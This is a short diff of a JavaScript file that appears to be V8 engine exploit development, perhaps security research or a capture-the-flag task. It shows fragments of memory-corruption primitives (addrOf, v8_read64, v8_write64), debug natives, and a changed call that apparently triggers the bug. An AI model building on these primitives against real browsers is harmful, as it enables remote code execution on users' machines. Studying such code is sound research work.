@@ -42,7 +42,7 @@ for (var i = 0; i < 0x10000; ++i) {
 // console.log(addrOf(u16arr).toString(16));
 // console.log(v8_read64(addrOf(u16arr)+0x17).toString(16));
 
-// let target = Number();
+// let target = Number(0x20000000000n);
 // v8_write64(addrOf(u16arr)+0x19,0x2e00000n);
 
 %DebugPrint(gsab);
@@ -52,4 +52,4 @@ for (var i = 0; i < 0x10000; ++i) {
 
 %SystemBreak();
 
-console.log(test(1,0).toString(16));
+test(0x2000000,0);
